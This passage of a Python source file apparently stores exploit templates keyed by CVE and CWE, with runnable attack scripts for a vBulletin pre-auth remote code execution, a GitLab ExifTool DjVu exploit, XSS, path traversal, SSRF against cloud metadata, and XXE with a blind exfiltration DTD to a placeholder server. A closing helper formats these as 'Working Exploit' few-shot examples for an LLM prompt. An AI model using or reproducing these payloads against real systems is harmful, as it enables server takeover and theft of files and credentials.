    """Create DjVu file with embedded command."""
    # This requires djvulibre tools
    # djvumake exploit.djvu 'INFO=1,1' 'BGjp=/dev/null' 'ANTz=<command>'
    print(f"[*] Creating malicious DjVu with command: {cmd}")
    return None

def exploit(cmd="id"):
    print(f"[*] CVE-2021-22205 - GitLab ExifTool RCE")
    print(f"[*] Target: {target}")
    
    # Endpoint that processes uploaded images
    upload_url = f"{target}/uploads/user"
    
    print("[*] This exploit requires:")
    print("    1. Create malicious DjVu file with djvulibre")
    print("    2. Upload via /uploads/user endpoint")
    print("    3. ExifTool processes file and executes command")
    
    print("[*] Create payload with:")
    print(f'    djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTz="(echo {cmd})"')
    
    return False

if __name__ == "__main__":
    exploit("id > /tmp/pwned")
''',
        success_indicators=["200", "upload"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-22205"]
    ),
    
    # =========================================================================
    # VBULLETIN CVEs
    # =========================================================================
    
    "CVE-2019-16759": CVEExploitTemplate(
        cve_id="CVE-2019-16759",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="vBulletin Pre-Auth RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["vBulletin 5.x < 5.5.4"],
        description="vBulletin allows unauthenticated RCE via widget template code injection.",
        exploit_template='''import requests

# CVE-2019-16759: vBulletin Pre-Auth RCE
# CWE-94: Code Injection

target = "{target}"

def exploit(cmd="id"):
    print(f"[*] CVE-2019-16759 - vBulletin Pre-Auth RCE")
    print(f"[*] Target: {target}")
    
    url = f"{target}/ajax/render/widget_php"
    
    # PHP code injection via widgetConfig
    data = {{
        "widgetConfig[code]": f"echo shell_exec('{cmd}'); exit;"
    }}
    
    print(f"[*] Sending payload...")
    
    try:
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200 and response.text:
            print(f"[+] RCE Successful!")
            print(f"[+] Output: {response.text}")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "www-data", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-16759"]
    ),
    
    # =========================================================================
    # ADDITIONAL CWE TEMPLATES
    # =========================================================================
    
    "CWE-79": CVEExploitTemplate(
        cve_id="CWE-79",
        cwe="CWE-79",
        cwe_name="Cross-Site Scripting (XSS)",
        name="Cross-Site Scripting",
        severity="Medium",
        protocol="HTTP",
        affected_products=["Generic Web Applications"],
        description="XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
        exploit_template='''import requests
import urllib.parse

# CWE-79: Cross-Site Scripting (XSS)
target = "{target}"

def exploit():
    print(f"[*] Testing XSS")
    print(f"[*] Target: {target}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body onload=alert('XSS')>",
    ]
    
    params = ["q", "search", "name", "id", "query", "input"]
    
    for payload in payloads:
        for param in params:
            url = f"{target}?{param}={urllib.parse.quote(payload)}"
            
            try:
                response = requests.get(url, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text or urllib.parse.unquote(payload) in response.text:
                    print(f"[+] XSS Found!")
                    print(f"[+] Param: {param}")
                    print(f"[+] Payload: {payload}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["<script>", "alert", "XSS"],
        references=["https://cwe.mitre.org/data/definitions/79.html"]
    ),
    
    "CWE-22": CVEExploitTemplate(
        cve_id="CWE-22",
        cwe="CWE-22",
        cwe_name="Path Traversal",
        name="Path Traversal / Directory Traversal",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="Path traversal allows attackers to access files outside the intended directory.",
        exploit_template='''import requests

# CWE-22: Path Traversal
target = "{target}"

def exploit():
    print(f"[*] Testing Path Traversal")
    print(f"[*] Target: {target}")
    
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    
    params = ["file", "path", "page", "doc", "folder", "download"]
    
    for payload in payloads:
        for param in params:
            url = f"{target}?{param}={payload}"
            
            try:
                response = requests.get(url, timeout=10)
                
                # Check for file content indicators
                if "root:" in response.text or "[fonts]" in response.text:
                    print(f"[+] Path Traversal Found!")
                    print(f"[+] URL: {url}")
                    print(f"[+] Content: {response.text[:500]}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["root:", "passwd", "[fonts]", "localhost"],
        references=["https://cwe.mitre.org/data/definitions/22.html"]
    ),
    
    "CWE-918": CVEExploitTemplate(
        cve_id="CWE-918",
        cwe="CWE-918",
        cwe_name="Server-Side Request Forgery (SSRF)",
        name="SSRF",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="SSRF allows attackers to make requests from the server to internal resources.",
        exploit_template='''import requests

# CWE-918: Server-Side Request Forgery (SSRF)
target = "{target}"
callback = "http://YOUR_SERVER:8080"  # Your listening server

def exploit():
    print(f"[*] Testing SSRF")
    print(f"[*] Target: {target}")
    
    # Internal targets
    ssrf_targets = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://192.168.1.1",  # Common internal
    ]
    
    params = ["url", "uri", "path", "link", "src", "redirect", "callback"]
    
    for ssrf_target in ssrf_targets:
        for param in params:
            url = f"{target}?{param}={ssrf_target}"
            
            try:
                response = requests.get(url, timeout=10)
                
                if "ami-id" in response.text or "internal" in response.text.lower():
                    print(f"[+] SSRF Found!")
                    print(f"[+] Target: {ssrf_target}")
                    print(f"[+] Response: {response.text[:500]}")
                    return True
                    
            except Exception as e:
                pass
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["ami-id", "meta-data", "internal", "127.0.0.1"],
        references=["https://cwe.mitre.org/data/definitions/918.html"]
    ),
    
    "CWE-611": CVEExploitTemplate(
        cve_id="CWE-611",
        cwe="CWE-611",
        cwe_name="XML External Entity (XXE)",
        name="XXE Injection",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic XML Parsers"],
        description="XXE allows attackers to read files, perform SSRF, and potentially achieve RCE.",
        exploit_template='''import requests

# CWE-611: XML External Entity (XXE) Injection
target = "{target}"

def exploit():
    print(f"[*] Testing XXE")
    print(f"[*] Target: {target}")
    
    # XXE payload to read /etc/passwd
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

    # Blind XXE with external DTD
    blind_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>"""

    headers = {{"Content-Type": "application/xml"}}
    
    print("[*] Trying direct XXE...")
    
    try:
        response = requests.post(target, data=xxe_payload, headers=headers, timeout=10)
        
        if "root:" in response.text:
            print("[+] XXE Successful!")
            print(f"[+] Content: {response.text}")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    print("[*] For blind XXE, host this DTD on your server:")
    print('<!ENTITY % file SYSTEM "file:///etc/passwd">')
    print('<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \\'http://YOUR_SERVER/?x=%file;\\'>">')
    print("%eval; %exfil;")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["root:", "passwd", "<!ENTITY"],
        references=["https://cwe.mitre.org/data/definitions/611.html"]
    ),
}



def get_cve_template(cve_id: str) -> Optional[CVEExploitTemplate]:
    """Get exploit template for a specific CVE."""
    return CVE_EXPLOIT_TEMPLATES.get(cve_id)


def get_cwe_template(cwe: str) -> Optional[CVEExploitTemplate]:
    """Get exploit template by CWE (fallback if no CVE match)."""
    # Clean CWE format
    cwe_clean = cwe.upper().split(":")[0].strip()
    
    # First check for exact CWE match
    if cwe_clean in CVE_EXPLOIT_TEMPLATES:
        return CVE_EXPLOIT_TEMPLATES[cwe_clean]
    
    # Then check CVEs by their CWE
    for template in CVE_EXPLOIT_TEMPLATES.values():
        if template.cwe == cwe_clean:
            return template
    
    return None


def get_template_for_context(cve: str = None, cwe: str = None) -> Optional[CVEExploitTemplate]:
    """Get best matching template for vulnerability context."""
    if cve:
        template = get_cve_template(cve)
        if template:
            return template
    
    if cwe:
        template = get_cwe_template(cwe)
        if template:
            return template
    
    return None


def format_template_for_prompt(template: CVEExploitTemplate, target: str = "http://localhost") -> str:
    """Format template as few-shot example for LLM prompt."""
    formatted = f'''
**CVE-SPECIFIC EXAMPLE: {template.cve_id}**
- **Name**: {template.name}
- **CWE**: {template.cwe} ({template.cwe_name})
- **Severity**: {template.severity}
- **Protocol**: {template.protocol}
- **Description**: {template.description}

**Working Exploit:**
```python
{template.exploit_template.format(target=target, target_ip=target.replace("http://", "").replace("https://", "").split(":")[0])}
```

**Success Indicators**: {", ".join(template.success_indicators)}
'''
    return formatted
